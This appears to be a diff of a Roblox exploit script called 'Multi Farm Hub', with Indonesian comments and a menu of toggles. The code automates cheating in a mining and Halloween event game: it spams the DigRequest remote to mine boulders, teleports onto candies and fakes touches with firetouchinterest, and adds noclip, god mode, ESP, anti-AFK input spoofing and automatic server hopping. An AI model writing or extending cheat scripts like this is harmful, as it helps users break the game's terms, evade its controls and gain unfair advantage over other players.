+    local lastHP = boulderHasHP(nearestModel)
+    local hitsSinceHPChange = 0
+    local cells = getBoulderCells(nearestModel)
+    local currentCellIndex = 1
+
+    while isBoulderRunning and nearestModel.Parent do
+        local hp = boulderHasHP(nearestModel)
+        if hp ~= nil and hp <= 0 then break end
+
+        if hp ~= lastHP then
+            lastHP = hp
+            hitsSinceHPChange = 0
+        else
+            hitsSinceHPChange = hitsSinceHPChange + 1
+        end
+
+        if #cells == 0 or not cells[currentCellIndex]
+           or not cells[currentCellIndex].Parent
+           or cells[currentCellIndex].Parent ~= nearestModel then
+            cells = getBoulderCells(nearestModel)
+            if #cells == 0 then break end
+            currentCellIndex = (currentCellIndex % #cells) + 1
+            hitsSinceHPChange = 0
+        end
+
+        if hitsSinceHPChange >= HP_STALL_HITS then
+            cells = getBoulderCells(nearestModel)
+            if #cells > 0 then
+                currentCellIndex = (currentCellIndex % #cells) + 1
+            end
+            hitsSinceHPChange = 0
+        end
+
+        local cell = cells[currentCellIndex]
+        if not cell or not cell.Parent then
+            cells = getBoulderCells(nearestModel)
+            currentCellIndex = 1
+            if #cells == 0 then break end
+            cell = cells[currentCellIndex]
+        end
+
+        local pickaxe = getEquippedPickaxe() or "The Event Horizon"
+        local args = { pickaxe, vector.create(cell.Position.X, cell.Position.Y, cell.Position.Z) }
+        local remotes = ReplicatedStorage:FindFirstChild("Remotes")
+        if remotes then
+            local digRequest = remotes:FindFirstChild("DigRequest")
+            if digRequest then
+                pcall(function() digRequest:FireServer(unpack(args)) end)
+            end
+        end
+
+        task.wait(BOULDER_DIG_INTERVAL)
+    end
+
+    processedBoulders[nearestModel] = true
+
+    local modelGone = not nearestModel.Parent
+    local waitTime = modelGone and 0 or CRYSTAL_PICKUP_TIME
+    if waitTime > 0 then task.wait(waitTime) end
+    collectCrystalsNearby(CRYSTAL_PICKUP_TIME)
+end
+
+local function boulderLoop()
+    while isBoulderRunning do
+        local models = getBoulderModels()
+        local nearestModel = getNearestBoulder(models)
+
+        if nearestModel and nearestModel.Parent then
+            processBoulder(nearestModel)
+        else
+            anchorPlayer(true)
+            faceBackDown()
+            task.wait(BOULDER_CHECK_INTERVAL)
+        end
+
+        task.wait(0.3)
+    end
+    stopMovementB()
+    anchorPlayer(false)
+end
+
+local function getCandyFolder()
+    return workspace:FindFirstChild(CANDY_FOLDER_NAME)
+end
+
+-- Sistem Auto Hop Server
 local function HopServer()
     if IsHopping then return end
     IsHopping = true
-    StatusLabel.Text = "Status: Hopping to new server..."
     
     local placeId = game.PlaceId
     local serversUrl = "https://games.roblox.com/v1/games/" .. placeId .. "/servers/Public?sortOrder=Asc&limit=100"
@@ -207,21 +859,20 @@ local function HopServer()
     TeleportService:Teleport(placeId, LocalPlayer)
 end
 
--- --------------------------------------------------------
--- ANTI AFK & ANTI DAMAGE
--- --------------------------------------------------------
+-- Sistem Anti-AFK Listener
 LocalPlayer.Idled:Connect(function()
-    if Settings.AntiAfk then
+    if AntiAfkEnabled then
         VirtualUser:Button2Down(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
         task.wait(1)
         VirtualUser:Button2Up(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
     end
 end)
 
+-- Sistem Anti-Damage Background Loop
 task.spawn(function()
     while true do
         task.wait(0.2)
-        if Settings.AntiDamage and LocalPlayer.Character then
+        if AntiDamageEnabled and LocalPlayer.Character then
             local hum = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
             if hum then
                 hum:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
@@ -234,13 +885,9 @@ task.spawn(function()
     end
 end)
 
--- --------------------------------------------------------
--- DETEKSI CANDY DENGAN VALIDASI BATAS MAP
--- --------------------------------------------------------
+-- Validasi Candy Asli & Batas Map
 local function IsRealCandy(part)
     if not part or not part:IsA("BasePart") then return false end
-    
-    -- Validasi agar mengabaikan permen yang nyangkut di luar map / koordinat ekstrem
     if math.abs(part.Position.X) > 5000 or math.abs(part.Position.Z) > 5000 or part.Position.Y < -500 or part.Position.Y > 2000 then
         return false
     end
@@ -257,7 +904,7 @@ local function IsRealCandy(part)
     return false
 end
 
-local function FindNearestCandy()
+local function GetNearestRealCandy()
     local nearest = nil
     local shortestDistance = math.huge
     local char = LocalPlayer.Character
@@ -265,7 +912,7 @@ local function FindNearestCandy()
     
     local hrp = char.HumanoidRootPart
 
-    for _, obj in pairs(Workspace:GetDescendants()) do
+    for _, obj in pairs(workspace:GetDescendants()) do
         if obj:IsA("BasePart") and IsRealCandy(obj) then
             local dist = (hrp.Position - obj.Position).Magnitude
             if dist < shortestDistance then
@@ -277,68 +924,397 @@ local function FindNearestCandy()
     return nearest
 end
 
--- --------------------------------------------------------
--- MAIN AUTO COLLECT LOOP (DENGAN AUTO-REFRESH CACHE)
--- --------------------------------------------------------
-task.spawn(function()
-    while true do
+-- Loop Utama Auto Collect Candy + Auto Hop
+local function candyLoop()
+    while isCandyRunning do
         task.wait(0.1)
         
-        -- Auto-refresh cache list permen setiap 5 detik agar list tidak macet
+        -- Auto-refresh cache list permen setiap 5 detik agar tidak macet
         if tick() - LastCacheClearTime > 5 then
             CollectedCandies = {}
             LastCacheClearTime = tick()
         end
         
-        if Settings.AutoCollect then
-            local candy = FindNearestCandy()
-            local char = LocalPlayer.Character
-            
-            if char and char:FindFirstChild("HumanoidRootPart") then
-                local hrp = char.HumanoidRootPart
-                
-                -- Jika karakter tidak sengaja jatuh atau stuck di luar map (Y < -100), reset ke tengah map
-                if hrp.Position.Y < -100 then
-                    hrp.CFrame = CFrame.new(0, 50, 0)
-                    task.wait(0.5)
-                end
-            end
-            
-            if candy and char and char:FindFirstChild("HumanoidRootPart") then
-                LastCandyFoundTime = tick() -- Reset timer 15 detik
-                
-                local hrp = char.HumanoidRootPart
-                
-                -- Teleport instan di atas permen asli
-                hrp.CFrame = candy.CFrame + Vector3.new(0, 0.5, 0)
-                
-                -- Tandai permen ini sementara
-                CollectedCandies[candy] = true
-                
-                pcall(function()
-                    firetouchinterest(hrp, candy, 0)
-                    firetouchinterest(hrp, candy, 1)
-                end)
-                
-                StatusLabel.Text = "Status: Collecting Candy..."
-                task.wait(0.2)
-            else
-                local noCandyTime = math.floor(tick() - LastCandyFoundTime)
-                StatusLabel.Text = "Status: No Candy (" .. noCandyTime .. "s/15s)\nKeybind: [RCTRL] Toggle UI"
-                
-                -- Auto Hop jika 15 detik kosong
-                if noCandyTime >= Settings.NoCandyHopDelay then
-                    StatusLabel.Text = "Status: No candy for 15s. Hopping..."
-                    HopServer()
-                end
+        local candy = GetNearestRealCandy()
+        local char = LocalPlayer.Character
+        
+        if char and char:FindFirstChild("HumanoidRootPart") then
+            local hrp = char.HumanoidRootPart
+            if hrp.Position.Y < -100 then
+                hrp.CFrame = CFrame.new(0, 50, 0)
+                task.wait(0.5)
             end
         end
         
-        -- Auto Hop Interval Server
+        if candy and char and char:FindFirstChild("HumanoidRootPart") then
+            LastCandyFoundTime = tick() -- Reset timer kosong 15 detik
+            local hrp = char.HumanoidRootPart
+            
+            hrp.CFrame = candy.CFrame + Vector3.new(0, 0.5, 0)
+            CollectedCandies[candy] = true
+            
+            pcall(function()
+                firetouchinterest(hrp, candy, 0)
+                firetouchinterest(hrp, candy, 1)
+            end)
+            task.wait(0.1)
+        else
+            local noCandyTime = math.floor(tick() - LastCandyFoundTime)
+            -- Auto Hop jika 15 detik kosong tidak ada permen
+            if noCandyTime >= NoCandyHopDelay then
+                HopServer()
+            end
+        end
+        
+        -- Auto Hop Berkala Sesuai Interval Waktu
         local timeInServer = tick() - LastServerHopTime
-        if timeInServer >= Settings.ServerHopInterval then
-            StatusLabel.Text = "Status: Reached interval timer. Hopping..."
+        if timeInServer >= ServerHopInterval then
             HopServer()
         end
     end
-end)
+end
+
+local function LimitFallSpeed()
+    if not isFallRunning then return end
+    local character = LocalPlayer.Character
+    if not character then return end
+
+    local rootPart = character:FindFirstChild("HumanoidRootPart")
+    if not rootPart then return end
+
+    local velocity = rootPart.AssemblyLinearVelocity
+    if velocity.Y < -MAX_FALL_SPEED then
+        rootPart.AssemblyLinearVelocity = Vector3.new(velocity.X, -MAX_FALL_SPEED, velocity.Z)
+    end
+end
+
+function startFallLimit()
+    if fallConnection then
+        pcall(function() fallConnection:Disconnect() end)
+        fallConnection = nil
+    end
+    isFallRunning = true
+    fallConnection = RunService.Heartbeat:Connect(LimitFallSpeed)
+end
+
+function stopFallLimit()
+    isFallRunning = false
+    if fallConnection then
+        pcall(function() fallConnection:Disconnect() end)
+        fallConnection = nil
+    end
+end
+
+local Window = Rayfield:CreateWindow({
+    Name = "Multi Farm Hub",
+    LoadingTitle = "Multi Farm Hub",
+    LoadingSubtitle = "Halloween + Boulders + Candy",
+    ConfigurationSaving = {
+        Enabled = true,
+        FolderName = "MultiFarmHub",
+        FileName = "Config",
+    },
+    KeySystem = false,
+})
+
+local HalloweenTab = Window:CreateTab("Halloween", 4483362458)
+
+HalloweenTab:CreateSection("Auto Collect")
+
+HalloweenTab:CreateToggle({
+    Name = "Auto Collect Ghosts & Pumpkins",
+    Info = "Automatically collects CaveGhost and SmashablePumpkin (noclip enabled)",
+    CurrentValue = false,
+    Flag = "AutoFarmHalloween",
+    Callback = function(Value)
+        isRunning = Value
+        if Value then
+            startNoclip()
+            disableAnimations()
+            task.spawn(halloweenLoop)
+        else
+            stopMovement()
+            anchorPlayer(false)
+            stopNoclip()
+            enableAnimations()
+        end
+    end,
+})
+
+HalloweenTab:CreateToggle({
+    Name = "Auto Collect Candy (Optimized)",
+    Info = "Auto teleport & touch real candies with anti-stuck & auto-hop",
+    CurrentValue = false,
+    Flag = "AutoCollectCandy",
+    Callback = function(Value)
+        isCandyRunning = Value
+        if Value then
+            LastCandyFoundTime = tick()
+            LastServerHopTime = tick()
+            task.spawn(candyLoop)
+        end
+    end,
+})
+
+HalloweenTab:CreateToggle({
+    Name = "Anti Damage / God Mode",
+    Info = "Prevents falling down/ragdoll and keeps HP full",
+    CurrentValue = false,
+    Flag = "AntiDamageToggle",
+    Callback = function(Value)
+        AntiDamageEnabled = Value
+    end,
+})
+
+HalloweenTab:CreateToggle({
+    Name = "Anti AFK Protector",
+    Info = "Prevents getting kicked by Roblox for inactivity",
+    CurrentValue = false,
+    Flag = "AntiAfkToggle",
+    Callback = function(Value)
+        AntiAfkEnabled = Value
+    end,
+})
+
+HalloweenTab:CreateSlider({
+    Name = "Server Hop Interval (Minutes)",
+    Info = "Automatically hops to a new server after set minutes",
+    Range = {1, 120},
+    Increment = 1,
+    Suffix = " Mnt",
+    CurrentValue = 120,
+    Flag = "ServerHopIntervalSlider",
+    Callback = function(Value)
+        ServerHopInterval = Value * 60
+    end,
+})
+
+HalloweenTab:CreateButton({
+    Name = "Reset Halloween List",
+    Info = "Clear the processed items list",
+    Callback = function()
+        processedItems = {}
+        Rayfield:Notify({ Title = "Halloween", Content = "List cleared", Duration = 3 })
+    end,
+})
+
+HalloweenTab:CreateSection("Info")
+
+HalloweenTab:CreateParagraph({
+    Title = "Targets",
+    Content = table.concat(TARGET_NAMES, ", "),
+})
+
+HalloweenTab:CreateParagraph({
+    Title = "Candy Event",
+    Content = "Focuses on real game candies. Auto-hops if empty for 15s.",
+})
+
+local BoulderTab = Window:CreateTab("Boulders", 4483362458)
+
+BoulderTab:CreateSection("Auto Farm")
+
+BoulderTab:CreateToggle({
+    Name = "Auto Farm Boulders",
+    Info = "Teleports to boulder center (-10 studs), mines cells, auto-switches, collects crystals",
+    CurrentValue = false,
+    Flag = "AutoFarmBoulders",
+    Callback = function(Value)
+        isBoulderRunning = Value
+        if Value then
+            startNoclip()
+            disableAnimations()
+            task.spawn(boulderLoop)
+        else
+            stopMovementB()
+            anchorPlayer(false)
+            stopNoclip()
+            enableAnimations()
+        end
+    end,
+})
+
+BoulderTab:CreateSlider({
+    Name = "Boulder Dig Speed",
+    Info = "Delay between hits (lower = faster, but higher rate-limit risk)",
+    Range = {0.05, 0.5},
+    Increment = 0.01,
+    Suffix = "s",
+    CurrentValue = BOULDER_DIG_INTERVAL,
+    Flag = "BoulderDigSpeed",
+    Callback = function(Value)
+        BOULDER_DIG_INTERVAL = Value
+    end,
+})
+
+BoulderTab:CreateSlider({
+    Name = "HP Stall Threshold",
+    Info = "How many hits without HP change before switching cell",
+    Range = {10, 200},
+    Increment = 5,
+    Suffix = "hits",
+    CurrentValue = HP_STALL_HITS,
+    Flag = "HPStallThreshold",
+    Callback = function(Value)
+        HP_STALL_HITS = Value
+    end,
+})
+
+BoulderTab:CreateToggle({
+    Name = "Anti Fall Damage",
+    Info = "Limits vertical fall speed to prevent fall damage",
+    CurrentValue = false,
+    Flag = "AntiFallDamage",
+    Callback = function(Value)
+        if Value then
+            startFallLimit()
+        else
+            stopFallLimit()
+        end
+    end,
+})
+
+BoulderTab:CreateButton({
+    Name = "Reset Boulder List",
+    Info = "Clear the processed boulders list",
+    Callback = function()
+        processedBoulders = {}
+        Rayfield:Notify({ Title = "Boulders", Content = "List cleared", Duration = 3 })
+    end,
+})
+
+BoulderTab:CreateSection("Boulder Selection")
+
+for _, boulderName in ipairs(ALL_BOULDER_TYPES) do
+    BoulderTab:CreateToggle({
+        Name = "Mine: " .. boulderName,
+        CurrentValue = true,
+        Flag = "Mine_" .. boulderName,
+        Callback = function(Value)
+            BOULDER_NAMES[boulderName] = Value
+            if Value then
+                processedBoulders = {}
+            end
+        end,
+    })
+end
+
+BoulderTab:CreateButton({
+    Name = "Select All Boulders",
+    Callback = function()
+        for _, name in ipairs(ALL_BOULDER_TYPES) do
+            BOULDER_NAMES[name] = true
+        end
+        processedBoulders = {}
+        Rayfield:Notify({ Title = "Boulders", Content = "All enabled", Duration = 2 })
+    end,
+})
+
+BoulderTab:CreateButton({
+    Name = "Deselect All Boulders",
+    Callback = function()
+        for _, name in ipairs(ALL_BOULDER_TYPES) do
+            BOULDER_NAMES[name] = false
+        end
+        Rayfield:Notify({ Title = "Boulders", Content = "All disabled", Duration = 2 })
+    end,
+})
+
+BoulderTab:CreateSection("Pickaxe")
+
+BoulderTab:CreateDropdown({
+    Name = "Active Pickaxe",
+    Info = "Choose the pickaxe name sent in DigRequest. Use 'Auto (equipped)' to detect from Character/Backpack.",
+    Options = {"Auto (equipped)", table.unpack(ALL_PICKAXES)},
+    CurrentOption = {"Auto (equipped)"},
+    MultipleOptions = false,
+    Flag = "ActivePickaxe",
+    Callback = function(option)
+        local val = option[1]
+        if val == "Auto (equipped)" or val == nil then
+            manualPickaxe = nil
+        else
+            manualPickaxe = val
+        end
+    end,
+})
+
+BoulderTab:CreateButton({
+    Name = "Print Equipped Pickaxe",
+    Info = "Shows in F9 which pickaxe the script currently uses",
+    Callback = function()
+        local p = getEquippedPickaxe()
+        print("[Pickaxe] Equipped:", p or "NONE")
+        Rayfield:Notify({
+            Title = "Pickaxe",
+            Content = p or "Not found",
+            Duration = 3,
+        })
+    end,
+})
+
+BoulderTab:CreateSection("Boulder ESP")
+
+BoulderTab:CreateToggle({
+    Name = "Boulder ESP",
+    Info = "Shows HP / name / rarity / distance above each boulder + highlight",
+    CurrentValue = false,
+    Flag = "BoulderESP",
+    Callback = function(Value)
+        if Value then
+            StartESP()
+            Rayfield:Notify({
+                Title = "ESP",
+                Content = "Boulder ESP enabled",
+                Duration = 2,
+            })
+        else
+            StopESP()
+            Rayfield:Notify({
+                Title = "ESP",
+                Content = "Boulder ESP disabled",
+                Duration = 2,
+            })
+        end
+    end,
+})
+
+BoulderTab:CreateButton({
+    Name = "Refresh ESP",
+    Info = "Force re-scan for new boulders",
+    Callback = function()
+        if not ESP_ENABLED then
+            Rayfield:Notify({
+                Title = "ESP",
+                Content = "Turn ESP on first",
+                Duration = 2,
+            })
+            return
+        end
+        InitAllBoulders()
+        Rayfield:Notify({
+            Title = "ESP",
+            Content = "Rescanned",
+            Duration = 2,
+        })
+    end,
+})
+
+BoulderTab:CreateSection("Info")
+
+BoulderTab:CreateParagraph({
+    Title = "Boulder Folder",
+    Content = "Workspace." .. table.concat(BOULDER_FOLDER_PATH, "."),
+})
+
+BoulderTab:CreateParagraph({
+    Title = "Settings",
+    Content = "Speed: " .. SPEED .. " studs/s\nOffset Y: " .. BOULDER_OFFSET_Y ..
+              " studs\nCrystal pickup: " .. CRYSTAL_PICKUP_TIME .. " sec",
+})
+
+Rayfield:Notify({
+    Title = "Multi Farm Hub",
+    Content = "Script loaded with Auto Candy + Hop + Anti-Damage.",
+    Duration = 3,
+})
